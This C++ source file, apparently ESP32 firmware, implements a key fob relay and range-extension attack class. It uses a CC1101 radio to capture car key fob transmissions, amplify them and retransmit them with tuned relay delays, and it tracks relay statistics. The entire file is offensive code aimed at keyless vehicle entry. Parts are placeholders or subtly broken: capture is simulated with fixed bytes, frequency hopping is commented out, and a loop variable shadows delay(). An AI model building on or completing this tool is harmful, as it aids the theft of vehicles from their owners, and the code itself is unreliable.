#include "KeyFobExtensionAttack.h"

KeyFobExtensionAttack::KeyFobExtensionAttack()
{
    signalProcessor = &RF_PROCESSOR;
    active = false;
    stats = {0, 0, 0.0f, 0.0f, 0};
}

KeyFobExtensionAttack::~KeyFobExtensionAttack()
{
    // Don't delete signalProcessor as it's a singleton
}

bool KeyFobExtensionAttack::init(const Config &config)
{
    this->config = config;

    // Initialize CC1101 with key fob specific settings
    ELECHOUSE_CC1101.Init();
    ELECHOUSE_CC1101.setModulation(config.modulation);
    ELECHOUSE_CC1101.setMHZ(config.frequency / 1000000.0f);
    ELECHOUSE_CC1101.SetRx();

    // Set initial amplification
    if (config.amplificationEnabled)
    {
        adjustAmplification(config.amplificationLevel);
    }

    return true;
}

bool KeyFobExtensionAttack::startRelay()
{
    if (active)
    {
        return false;
    }

    active = true;
    signalProcessor->beginReceive(config.frequency);

    // Clear statistics
    stats = {0, 0, 0.0f, 0.0f, 0};

    return true;
}

bool KeyFobExtensionAttack::stopRelay()
{
    if (!active)
    {
        return false;
    }

    active = false;
    signalProcessor->endReceive();

    // Clean up signal queue
    while (!signalQueue.empty())
    {
        signalQueue.pop();
    }

    return true;
}

bool KeyFobExtensionAttack::isActive() const
{
    return active;
}

bool KeyFobExtensionAttack::processIncomingSignal()
{
    if (!active)
    {
        return false;
    }

    SignalData signal;
    signal.timestamp = millis();
    signal.signalStrength = measureSignalStrength();

    // Simulate signal capture for now
    signal.rawSignal = {0xAA, 0x55, 0x12, 0x34, 0x56, 0x78};

    if (!validateSignal(signal))
    {
        updateStats(false, 0);
        return false;
    }

    signalQueue.push(signal);
    return amplifyAndRelay(signal);
}

bool KeyFobExtensionAttack::amplifyAndRelay(const SignalData &signal)
{
    if (!config.amplificationEnabled)
    {
        return false;
    }

    // Optimize amplification based on signal strength and target range
    uint8_t optimalAmp = calculateOptimalAmplification();
    adjustAmplification(optimalAmp);

    // Switch to transmit mode
    ELECHOUSE_CC1101.SetTx();

    // Add relay delay if configured
    if (config.relayDelay > 0)
    {
        delayMicroseconds(config.relayDelay);
    }

    // Convert signal to timing array for transmission
    unsigned long timings[signal.rawSignal.size() * 16];
    size_t timingCount = 0;

    // Convert bytes to timing pulses
    for (size_t i = 0; i < signal.rawSignal.size(); i++)
    {
        uint8_t byte = signal.rawSignal[i];
        for (int bit = 7; bit >= 0; bit--)
        {
            if (byte & (1 << bit))
            {
                timings[timingCount++] = 500;
                timings[timingCount++] = 500;
            }
            else
            {
                timings[timingCount++] = 1000;
                timings[timingCount++] = 1000;
            }
        }
    }

    // Transmit using RF signal processor
    bool success = signalProcessor->transmitRaw(timings, timingCount);

    // Switch back to receive mode
    ELECHOUSE_CC1101.SetRx();

    // Update statistics
    updateStats(success, config.relayDelay);

    return success;
}

float KeyFobExtensionAttack::measureSignalStrength()
{
    // Read RSSI from CC1101
    return ELECHOUSE_CC1101.getRssi();
}

bool KeyFobExtensionAttack::extendRange(uint16_t targetDistance)
{
    if (targetDistance > config.maxRelayDistance)
    {
        return false;
    }

    // Calculate required amplification for target distance
    float attenuation = 20 * log10(targetDistance); // Path loss model
    uint8_t requiredAmp = static_cast<uint8_t>(attenuation / 2);

    if (requiredAmp > 12)
    { // CC1101 max power level
        requiredAmp = 12;
    }

    adjustAmplification(requiredAmp);
    return true;
}

void KeyFobExtensionAttack::adjustAmplification(uint8_t level)
{
    if (level > 12)
        level = 12; // Maximum CC1101 power level
    ELECHOUSE_CC1101.setPa(level);
}

bool KeyFobExtensionAttack::optimizeRelayDelay()
{
    uint16_t minDelay = 100;  // Minimum processing delay
    uint16_t maxDelay = 1000; // Maximum acceptable delay
    uint16_t optimalDelay = minDelay;
    float bestSuccessRate = 0;

    // Test different delays
    for (uint16_t delay = minDelay; delay <= maxDelay; delay += 100)
    {
        config.relayDelay = delay;
        uint32_t successCount = 0;

        // Test multiple transmissions
        for (int i = 0; i < 10; i++)
        {
            if (processIncomingSignal())
            {
                successCount++;
            }
            delay(50); // Wait between tests
        }

        float successRate = successCount / 10.0f;
        if (successRate > bestSuccessRate)
        {
            bestSuccessRate = successRate;
            optimalDelay = delay;
        }
    }

    config.relayDelay = optimalDelay;
    return (bestSuccessRate > 0.7f); // Consider optimized if success rate > 70%
}

bool KeyFobExtensionAttack::startRangeExtension()
{
    if (!active)
    {
        return false;
    }

    // Start with maximum amplification
    adjustAmplification(12);

    // Enable frequency hopping if configured
    if (config.autoFrequencyHopping)
    {
        setFrequencyHopping(true);
    }

    return true;
}

bool KeyFobExtensionAttack::startSignalAmplification()
{
    if (!active)
    {
        return false;
    }

    config.amplificationEnabled = true;
    return true;
}

void KeyFobExtensionAttack::setFrequencyHopping(bool enabled)
{
    if (enabled)
    {
        // Set frequency hopping parameters for CC1101
        // Note: These methods may not exist in all CC1101 libraries
        // ELECHOUSE_CC1101.setFHSSChannel(0);
        // ELECHOUSE_CC1101.setFHSSstep(10); // 10kHz steps
        // ELECHOUSE_CC1101.setFHSSsize(10); // 10 channels
        log_i("Frequency hopping enabled");
    }
    else
    {
        // Disable frequency hopping
        // ELECHOUSE_CC1101.setFHSSsize(0);
        log_i("Frequency hopping disabled");
    }
}

KeyFobExtensionAttack::RelayStats KeyFobExtensionAttack::getRelayStatistics()
{
    return stats;
}

float KeyFobExtensionAttack::getEstimatedRange()
{
    float signalStrength = measureSignalStrength();
    // Estimate range based on signal strength (simplified path loss model)
    return pow(10, ((-signalStrength - 40) / 20)); // in meters
}

uint32_t KeyFobExtensionAttack::getCurrentDelay()
{
    return config.relayDelay;
}

bool KeyFobExtensionAttack::validateSignal(const SignalData &signal)
{
    if (signal.rawSignal.empty())
    {
        return false;
    }

    // Check signal strength
    if (signal.signalStrength < config.minSignalStrength)
    {
        return false;
    }

    // Basic validation of signal pattern
    if (signal.rawSignal.size() < 4)
    { // Minimum viable key fob signal size
        return false;
    }

    return true;
}

void KeyFobExtensionAttack::updateStats(bool success, uint32_t delay)
{
    if (success)
    {
        stats.packetsRelayed++;
        stats.averageDelay = (stats.averageDelay * (stats.packetsRelayed - 1) + delay) / stats.packetsRelayed;
        stats.lastSuccessTime = millis();

        float currentRange = getEstimatedRange();
        if (currentRange > stats.maxRange)
        {
            stats.maxRange = currentRange;
        }
    }
    else
    {
        stats.failedRelays++;
    }
}

bool KeyFobExtensionAttack::adjustFrequency(uint32_t targetFreq)
{
    if (targetFreq < 300000000 || targetFreq > 928000000)
    { // CC1101 frequency range
        return false;
    }

    ELECHOUSE_CC1101.setMHZ(targetFreq / 1000000.0);
    return true;
}

void KeyFobExtensionAttack::optimizeParameters()
{
    // Optimize amplification
    uint8_t optAmp = calculateOptimalAmplification();
    adjustAmplification(optAmp);

    // Optimize relay delay
    optimizeRelayDelay();

    // Clean up old signals
    cleanupOldSignals();
}

uint8_t KeyFobExtensionAttack::calculateOptimalAmplification()
{
    float signalStrength = measureSignalStrength();
    float targetStrength = -60.0f; // Typical good signal strength

    // Calculate required amplification
    float requiredGain = targetStrength - signalStrength;
    uint8_t ampLevel = static_cast<uint8_t>(requiredGain / 6); // Each level is roughly 6dB

    if (ampLevel > 12)
        ampLevel = 12; // Maximum CC1101 power level
    if (ampLevel < 0)
        ampLevel = 0; // Minimum power level

    return ampLevel;
}

bool KeyFobExtensionAttack::isWithinRange(float signalStrength)
{
    return signalStrength >= config.minSignalStrength;
}

void KeyFobExtensionAttack::cleanupOldSignals()
{
    uint32_t currentTime = millis();
    uint32_t maxAge = 1000; // Maximum age of stored signals (1 second)

    while (!signalQueue.empty())
    {
        const SignalData &oldestSignal = signalQueue.front();
        if (currentTime - oldestSignal.timestamp > maxAge)
        {
            signalQueue.pop();
        }
        else
        {
            break;
        }
    }
}
